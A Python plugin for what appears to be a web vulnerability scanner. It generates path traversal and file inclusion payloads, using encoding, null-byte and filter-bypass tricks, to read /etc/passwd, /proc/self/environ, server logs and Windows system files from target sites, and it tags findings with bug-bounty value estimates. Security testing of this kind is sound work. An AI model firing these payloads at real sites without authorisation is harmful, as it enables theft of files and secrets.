"""
Professional-Grade Path Traversal (Directory Traversal) Plugin
Detects path traversal and local file inclusion vulnerabilities

Supports:
- Basic path traversal (../../etc/passwd)
- Absolute path access (/etc/passwd)
- URL encoding bypass (%2e%2e%2f)
- Double URL encoding (%252e%252e%252f)
- Unicode encoding (%c0%ae%c0%ae/)
- OS-specific paths (Windows, Linux)
- Null byte injection (../../etc/passwd%00)
- Filter bypasses (....//....//etc/passwd)
- Case sensitivity bypass
- Common file access (passwd, win.ini, hosts, logs)
"""

import re
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, quote, urljoin
from bs4 import BeautifulSoup
from scanner.plugins.base import BasePlugin
from scanner.logger import get_logger

LOG = get_logger("vuln-scanner")


class PathTraversalPayloads:
    """Comprehensive path traversal payload library"""

    # Target files for different OS
    LINUX_FILES = {
        "/etc/passwd": ["root:", "bin:", "daemon:", "nobody:"],
        "/etc/hosts": ["localhost", "127.0.0.1"],
        "/etc/issue": ["linux", "ubuntu", "debian", "centos", "redhat"],
        "/proc/self/environ": ["PATH=", "HOME=", "USER="],
        "/var/log/apache2/access.log": ["GET", "POST", "HTTP"],
        "/var/log/nginx/access.log": ["GET", "POST", "HTTP"],
    }

    WINDOWS_FILES = {
        "C:\\Windows\\win.ini": ["[extensions]", "[files]", "mci"],
        "C:\\Windows\\System32\\drivers\\etc\\hosts": ["localhost", "127.0.0.1"],
        "C:\\boot.ini": ["boot loader", "operating systems"],
        "C:\\Windows\\System.ini": ["[drivers]", "[boot]"],
    }

    # Common parameter names for path/file operations
    PATH_PARAMS = [
        "file", "filename", "path", "filepath", "document", "page",
        "template", "include", "load", "view", "dir", "folder",
        "resource", "doc", "download", "read", "get", "show",
        "cat", "pdf", "img", "image", "src", "source"
    ]

    @staticmethod
    def generate_traversal_payloads(target_file: str, os_type: str = "linux") -> List[tuple]:
        """Generate path traversal payloads for a target file"""
        payloads = []

        # Determine path separator
        sep = "/" if os_type == "linux" else "\\"
        alt_sep = "\\" if os_type == "linux" else "/"

        # Basic traversal depths (0-8 levels)
        for depth in range(9):
            traversal = f"..{sep}" * depth

            # 1. Basic traversal
            payloads.append((f"{traversal}{target_file}", "basic"))

            # 2. URL encoded
            url_encoded = quote(f"{traversal}{target_file}", safe='')
            payloads.append((url_encoded, "url_encoded"))

            # 3. Double URL encoded
            double_encoded = quote(url_encoded, safe='')
            payloads.append((double_encoded, "double_encoded"))

            # 4. Mixed separators
            if depth > 0:
                mixed = f"..{alt_sep}" * depth + target_file
                payloads.append((mixed, "mixed_separators"))

            # 5. Filter bypass - doubled
            if depth > 0:
                doubled = f"....{sep}{sep}" * depth + target_file
                payloads.append((doubled, "doubled_traversal"))

            # 6. Filter bypass - semicolon
            if depth > 0:
                semicolon = f"..;{sep}" * depth + target_file
                payloads.append((semicolon, "semicolon_bypass"))

            # 7. Null byte injection
            if depth > 0:
                null_byte = f"{traversal}{target_file}%00"
                payloads.append((null_byte, "null_byte"))
                null_byte2 = f"{traversal}{target_file}%00.jpg"
                payloads.append((null_byte2, "null_byte_ext"))

        # Absolute paths
        payloads.append((target_file, "absolute"))

        # Unicode encoding for '../'
        payloads.append((f"%c0%ae%c0%ae{sep}%c0%ae%c0%ae{sep}{target_file}", "unicode"))

        # 16-bit Unicode encoding
        payloads.append((f"%u002e%u002e{sep}%u002e%u002e{sep}{target_file}", "unicode_16bit"))

        # Case variations (for case-sensitive systems)
        if os_type == "windows":
            payloads.append((target_file.upper(), "uppercase"))
            payloads.append((target_file.lower(), "lowercase"))

        return payloads

    @staticmethod
    def is_file_content_match(content: str, indicators: List[str]) -> bool:
        """Check if content contains file indicators"""
        content_lower = content.lower()
        return any(indicator.lower() in content_lower for indicator in indicators)


class Plugin(BasePlugin):
    name = "path_traversal"
    description = "Detects Path Traversal and Directory Traversal vulnerabilities"

    def __init__(self):
        super().__init__()
        self.payloads = PathTraversalPayloads()

    async def _test_linux_traversal(self, url: str, param: str, requester):
        """Test path traversal for Linux files"""
        vulnerabilities = []

        for target_file, indicators in list(self.payloads.LINUX_FILES.items())[:3]:  # Test top 3 files
            # Generate traversal payloads
            payloads = self.payloads.generate_traversal_payloads(target_file, "linux")

            for payload, technique in payloads[:15]:  # Test top 15 payloads per file
                test_params = {param: payload}

                try:
                    response = await requester.get(url, params=test_params)

                    if not response or not isinstance(response, dict):
                        continue

                    content = response.get("text", "")

                    # Check for file content indicators
                    if self.payloads.is_file_content_match(content, indicators):
                        vulnerabilities.append({
                            "type": "path_traversal_linux",
                            "param": param,
                            "payload": payload,
                            "target_file": target_file,
                            "technique": technique,
                            "message": f"Path traversal detected - {target_file} disclosed",
                            "severity": "high",
                            "confidence": "firm",
                            "impact": f"Local file disclosure via path traversal - {target_file} accessible",
                            "bounty_potential": "$2,000 - $20,000",
                        })
                        return vulnerabilities  # Stop on first confirmed

                except Exception as e:
                    LOG.debug(f"Linux traversal test failed: {e}")

        return vulnerabilities

    async def _test_windows_traversal(self, url: str, param: str, requester):
        """Test path traversal for Windows files"""
        vulnerabilities = []

        for target_file, indicators in list(self.payloads.WINDOWS_FILES.items())[:3]:  # Test top 3
            # Generate traversal payloads
            payloads = self.payloads.generate_traversal_payloads(target_file, "windows")

            for payload, technique in payloads[:15]:  # Test top 15 payloads per file
                test_params = {param: payload}

                try:
                    response = await requester.get(url, params=test_params)

                    if not response or not isinstance(response, dict):
                        continue

                    content = response.get("text", "")

                    # Check for file content indicators
                    if self.payloads.is_file_content_match(content, indicators):
                        vulnerabilities.append({
                            "type": "path_traversal_windows",
                            "param": param,
                            "payload": payload,
                            "target_file": target_file,
                            "technique": technique,
                            "message": f"Path traversal detected - {target_file} disclosed",
                            "severity": "high",
                            "confidence": "firm",
                            "impact": f"Local file disclosure via path traversal - {target_file} accessible",
                            "bounty_potential": "$2,000 - $20,000",
                        })
                        return vulnerabilities

                except Exception as e:
                    LOG.debug(f"Windows traversal test failed: {e}")

        return vulnerabilities

    async def _test_log_poisoning(self, url: str, param: str, requester):
        """Test for log poisoning via path traversal"""
        vulnerabilities = []

        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/apache/access.log",
        ]

        for log_file in log_files[:2]:  # Test top 2
            # Try to access log file
            payloads = self.payloads.generate_traversal_payloads(log_file, "linux")

            for payload, technique in payloads[:10]:
                test_params = {param: payload}

                try:
                    response = await requester.get(url, params=test_params)

                    if not response or not isinstance(response, dict):
                        continue

                    content = response.get("text", "")

                    # Check for log file indicators
                    log_indicators = ["GET", "POST", "HTTP/1.1", "Mozilla", "User-Agent"]

                    if self.payloads.is_file_content_match(content, log_indicators):
                        vulnerabilities.append({
                            "type": "path_traversal_log_poisoning",
                            "param": param,
                            "payload": payload,
                            "target_file": log_file,
                            "technique": technique,
                            "message": "Path traversal to log file - potential log poisoning",
                            "severity": "critical",
                            "confidence": "firm",
                            "impact": "Log poisoning can lead to RCE via LFI to log files",
                            "bounty_potential": "$5,000 - $30,000",
                        })
                        return vulnerabilities

                except Exception as e:
                    LOG.debug(f"Log poisoning test failed: {e}")

        return vulnerabilities

    async def _test_proc_environ(self, url: str, param: str, requester):
        """Test /proc/self/environ access (can contain sensitive data)"""
        vulnerabilities = []

        target_file = "/proc/self/environ"
        payloads = self.payloads.generate_traversal_payloads(target_file, "linux")

        for payload, technique in payloads[:15]:
            test_params = {param: payload}

            try:
                response = await requester.get(url, params=test_params)

                if not response or not isinstance(response, dict):
                    continue

                content = response.get("text", "")

                # Check for environment variable indicators
                indicators = ["PATH=", "HOME=", "USER=", "SHELL=", "PWD="]

                if self.payloads.is_file_content_match(content, indicators):
                    vulnerabilities.append({
                        "type": "path_traversal_environ",
                        "param": param,
                        "payload": payload,
                        "target_file": target_file,
                        "technique": technique,
                        "message": "Path traversal to /proc/self/environ - sensitive data disclosed",
                        "severity": "high",
                        "confidence": "firm",
                        "impact": "Environment variables disclosed, may contain secrets/credentials",
                        "bounty_potential": "$3,000 - $25,000",
                    })
                    return vulnerabilities

            except Exception as e:
                LOG.debug(f"Proc environ test failed: {e}")

        return vulnerabilities

    async def _find_path_parameters(self, target: str, requester):
        """Find potential path/file parameters in target"""
        params = []

        # Check URL parameters
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)

        for param_name in query_params.keys():
            if any(path_param in param_name.lower() for path_param in self.payloads.PATH_PARAMS):
                params.append(("url", param_name))

        # Check forms
        try:
            response = await requester.get(target)
            if response and isinstance(response, dict):
                soup = BeautifulSoup(response.get("text", ""), "html.parser")
                forms = soup.find_all("form")

                for form in forms:
                    inputs = form.find_all(["input", "textarea"])
                    for inp in inputs:
                        name = inp.get("name")
                        if name and any(path_param in name.lower() for path_param in self.payloads.PATH_PARAMS):
                            params.append(("form", name))
        except Exception:
            pass

        return params

    async def run(self, target: str, requester, oast_server: str = None):
        """Main entry point for path traversal scanning"""

        if not target.startswith("http"):
            return []

        vulnerabilities = []

        # Find potential path/file parameters
        params = await self._find_path_parameters(target, requester)

        if not params:
            return [{
                "type": "path_traversal_info",
                "message": "No obvious path/file parameters detected",
                "severity": "info",
                "confidence": "tentative",
            }]

        # Test each parameter
        for param_type, param_name in params[:5]:  # Test top 5 params
            LOG.info(f"Testing path traversal parameter: {param_name}")

            # 1. Test Linux traversal (highest priority)
            result = await self._test_linux_traversal(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue  # Stop testing this param if confirmed vuln

            # 2. Test Windows traversal
            result = await self._test_windows_traversal(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue

            # 3. Test log poisoning (critical - can lead to RCE)
            result = await self._test_log_poisoning(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue

            # 4. Test /proc/self/environ access
            result = await self._test_proc_environ(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)

        return vulnerabilities
